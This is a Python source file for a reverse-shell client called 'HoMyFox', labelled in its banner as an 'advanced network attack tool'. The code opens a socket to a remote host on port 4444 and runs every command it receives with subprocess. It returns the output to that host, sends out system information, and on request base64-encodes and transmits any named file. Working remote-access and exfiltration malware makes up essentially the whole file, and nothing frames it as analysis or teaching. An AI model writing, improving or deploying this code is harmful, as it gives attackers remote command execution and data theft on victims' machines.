import socket
import subprocess
import os
import platform
import random
import base64
import time
import hashlib


class HoMyFox:
    def __init__(self, host='127.0.0.1', port=4444):
        self.HOST = host
        self.PORT = port
        self.client = None
        self.hacker_jokes = [
            "Why do hackers prefer dark mode? Because light attracts bugs! 🐛",
            "I don't always test my code, but when I do, I do it in production. 😎",
            "sudo make me a sandwich? Nah, I'll just hack one instead! 🥪",
            "Debugging is like being a detective in a crime movie where you're also the murderer. 🕵️‍♂️",
            "Real programmers count from 0. Fight me! 👊",
        ]

    def display_ascii_art(self):
        fox_art = r"""
   ██████╗  ██████╗      ███╗   ███╗██╗   ██╗    ███████╗ ██████╗ ██╗  ██╗
  ██╔═══██╗██╔═══██╗     ████╗ ████║╚██╗ ██╔╝    ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║   ██║██║   ██║     ██╔████╔██║ ╚████╔╝     █████╗  ██║   ██║ ╚███╔╝ 
  ██║   ██║██║   ██║     ██║╚██╔╝██║  ╚██╔╝      ██╔══╝  ██║   ██║ ██╔██╗ 
  ╚██████╔╝╚██████╔╝     ██║ ╚═╝ ██║   ██║       ██║     ╚██████╔╝██╔╝ ██╗
   ╚═════╝  ╚═════╝      ╚═╝     ╚═╝   ╚═╝       ╚═╝      ╚═════╝ ╚═╝  ╚═╝
                   🦊 ADVANCED NETWORK ATTACK TOOL 🌐
        """
        print(fox_art)
        print(f"[🦊] System: {platform.system()} | Python: {platform.python_version()}\n")

    def random_hacker_joke(self):
        return random.choice(self.hacker_jokes)

    def encrypt_file(self, file_path):
        """Simple Base64 encoding as a lightweight 'encryption'"""
        try:
            with open(file_path, 'rb') as f:
                file_content = f.read()
            encoded = base64.b64encode(file_content)
            return encoded
        except Exception as e:
            print(f"[-] Encryption error: {e}")
            return None

    def generate_file_hash(self, file_path):
        """Generate SHA-256 hash of a file"""
        try:
            with open(file_path, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            return file_hash
        except Exception as e:
            print(f"[-] Hash generation error: {e}")
            return None

    def system_info(self):
        """Collect advanced system information"""
        info = {
            "OS": platform.platform(),
            "Hostname": platform.node(),
            "Processor": platform.processor(),
            "Python Version": platform.python_version(),
            "Architecture": platform.architecture()[0],
            "Machine": platform.machine()
        }
        return "\n".join([f"{k}: {v}" for k, v in info.items()])

    def send_file(self, file_name):
        try:
            if os.path.exists(file_name):
                file_hash = self.generate_file_hash(file_name)
                encrypted_file = self.encrypt_file(file_name)

                if encrypted_file and file_hash:
                    self.client.send(f"FILE_TRANSFER {file_name} {file_hash}".encode())
                    self.client.send(encrypted_file)
                    self.client.send(b"EOF")

                    print(f"[+] File {file_name} sent!")
                    print(f"[🔒] File Hash: {file_hash}")
                else:
                    self.client.send(b"ERROR: File processing failed.")
            else:
                self.client.send(b"ERROR: File not found.")
        except Exception as e:
            print(f"[-] File send error: {e}")

    def connect(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.display_ascii_art()
            print(f"[🦊] Connecting to {self.HOST}:{self.PORT}...")

            self.client.connect((self.HOST, self.PORT))
            print(f"[✅] Connected successfully!")
            print(f"[🎲] Bonus Hacker Joke: {self.random_hacker_joke()}\n")
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
        return True

    def start_session(self):
        if not self.connect():
            return

        while True:
            try:
                command = self.client.recv(1024).decode().strip()

                if command.lower() == "exit":
                    print("[*] Closing connection.")
                    break

                elif command.lower() == "help":
                    help_message = (
                        "🦊 HO MY FOX - NETWORK EXPLORATION TOOLKIT 🌐\n"
                        "AVAILABLE COMMANDS:\n"
                        " - exit: Close connection\n"
                        " - help: Show this help\n"
                        " - sysinfo: Get detailed system information\n"
                        " - send_file <filename>: Securely send a file\n"
                        " - joke: Get a random hacker joke\n"
                        " - [system command]: Execute system command\n"
                    )
                    self.client.send(help_message.encode())

                elif command == "sysinfo":
                    self.client.send(self.system_info().encode())

                elif command == "joke":
                    self.client.send(self.random_hacker_joke().encode())

                elif command.startswith("send_file"):
                    _, file_name = command.split(" ", 1)
                    self.send_file(file_name)

                else:
                    output = subprocess.getoutput(command)
                    self.client.send(output.encode())

            except Exception as e:
                print(f"[-] Session error: {e}")
                break

        self.client.close()


def main():
    fox = HoMyFox()
    fox.start_session()


if __name__ == "__main__":
    main()